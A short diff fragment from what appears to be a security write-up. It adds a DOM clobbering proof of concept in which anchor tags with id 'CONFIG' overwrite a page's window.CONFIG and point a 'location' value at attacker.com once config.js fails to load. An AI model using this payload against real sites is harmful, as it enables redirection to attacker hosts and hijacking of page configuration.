@@ -59,6 +59,11 @@ window.CONFIG = {
 
 #victim.com/vuln.html/ -> victim.com/vuln.html/config.js -> error
 <script src="config.js"></script>
+
+#POC
+<a id="CONFIG">1'deps</a>
+<a id="CONFIG" name="location" href="https://attacker.com"
+
 ```
 
 
